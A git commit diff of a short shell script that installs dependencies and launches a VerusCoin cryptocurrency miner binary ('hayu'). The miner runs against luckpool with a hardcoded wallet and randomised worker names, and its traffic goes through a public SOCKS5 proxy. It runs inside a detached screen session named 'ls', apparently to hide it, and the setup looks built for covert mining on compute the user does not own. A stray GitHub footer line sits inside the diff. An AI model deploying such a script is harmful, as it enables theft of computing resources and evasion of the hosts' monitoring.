0c1aaecc98d976091c623406a015c9612b5fe1c6
ajayy78 <87773034+ajayy78@users.noreply.github.com>
2021-07-22 22:08:33 +0700

    Update gass.sh

--- gass.sh
+++ gass.sh
@@ -1,10 +1,10 @@
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
+chmod +x mantap.sh && chmod +x hayu chmod 777 hayu mantap.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
 WORKER=$(echo $(shuf -i 1-10 -n 1)ojakk)
-PROXY=socks5://66.135.227.181:4145
+PROXY=socks5://98.178.72.8:4145
 ./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
 © 2021 GitHub, Inc.
